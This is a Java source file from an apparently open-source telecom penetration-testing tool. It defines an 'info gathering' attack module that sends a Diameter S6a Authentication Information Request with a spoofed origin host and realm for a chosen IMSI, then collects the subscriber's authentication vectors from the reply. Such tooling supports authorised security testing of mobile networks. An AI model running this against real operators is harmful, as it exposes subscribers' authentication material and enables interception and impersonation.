/*
 * Etisalat Egypt, Open Source
 * Copyright 2021, Etisalat Egypt and individual contributors
 * by the @authors tag.
 *
 * This program is free software: you can redistribute it and/or modify
 * under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation; either version 3 of
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>
 */

/**
 * @author Ayman ElSherif
 */

package com.rodan.intruder.diameter.usecases.attacks.infogathering;

import com.rodan.intruder.diameter.usecases.attacks.DiameterModuleTemplate;
import com.rodan.intruder.diameter.usecases.model.DiameterModuleConstants;
import com.rodan.intruder.diameter.usecases.model.infogathering.NewAuthParameterOptions;
import com.rodan.intruder.diameter.usecases.model.infogathering.NewAuthParameterResponse;
import com.rodan.intruder.diameter.usecases.port.DiameterGateway;
import com.rodan.intruder.diameter.entities.event.S6aListener;
import com.rodan.intruder.diameter.entities.event.model.AuthenticationInformationAnswer;
import com.rodan.intruder.diameter.entities.payload.s6a.AirPayload;
import com.rodan.intruder.kernel.usecases.SignalingModule;
import com.rodan.intruder.diameter.usecases.model.DiameterModuleOptions;
import com.rodan.library.model.Constants;
import com.rodan.library.model.annotation.Module;
import com.rodan.library.model.error.SystemException;
import lombok.Builder;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

@Module(name = DiameterModuleConstants.NEW_AUTH_PARAM_NAME, category = DiameterModuleConstants.INFO_GATHERING_CATEGORY_DISPLAY_NAME,
        displayName = DiameterModuleConstants.NEW_AUTH_PARAM_DISPLAY_NAME, brief = DiameterModuleConstants.NEW_AUTH_PARAM_BRIEF,
        description = DiameterModuleConstants.NEW_AUTH_PARAM_DESCRIPTION, rank = DiameterModuleConstants.NEW_AUTH_PARAM_RANK,
        mainPayload = Constants.AIR_PAYLOAD_NAME)
public class NewAuthParameterModule extends DiameterModuleTemplate implements SignalingModule, S6aListener {
    final static Logger logger = LogManager.getLogger(NewAuthParameterModule.class);

    @Builder
    public NewAuthParameterModule(DiameterGateway gateway, DiameterModuleOptions moduleOptions) {
        super(gateway, moduleOptions);
    }

    @Override
    protected void generatePayload() {
        logger.debug("Generating payload");
        logger.debug("Module Options: " + moduleOptions);
        var options = (NewAuthParameterOptions) moduleOptions;
        var payload = AirPayload.builder()
                .destinationRealm(options.getDestinationRealm()).spoofOrigin(options.getSpoofOrigin())
                .spoofedHost(options.getSpoofedHost()).spoofedRealm(options.getSpoofedRealm())
                .imsi(options.getImsi()).mcc(options.getMcc()).mnc(options.getMnc())
                .build();
        setMainPayload(payload);
        setCurrentPayload(getMainPayload());
        logger.debug("Payload: " + payload);
    }

    @Override
    protected void addServiceListener() throws SystemException {
        logger.debug("Adding service listeners");
        getGateway().addS6aListener(this);
    }

    @Override
    protected void cleanup() throws SystemException {
        if (this.getGateway() != null)
            this.getGateway().removeS6aListener(this);
    }

    @Override
    public void doAuthenticationInformationAnswerEvent(AuthenticationInformationAnswer answer) {
        logger.debug("[[[[ doAuthenticationInformationAnswerEvent ]]]]");
        logger.debug(answer);
        moduleResponse = NewAuthParameterResponse.builder()
                .authVectors(answer.getAuthVectors())
                .build();
        setResultReceived(true);
        logger.debug("AIR completed!");
    }
}
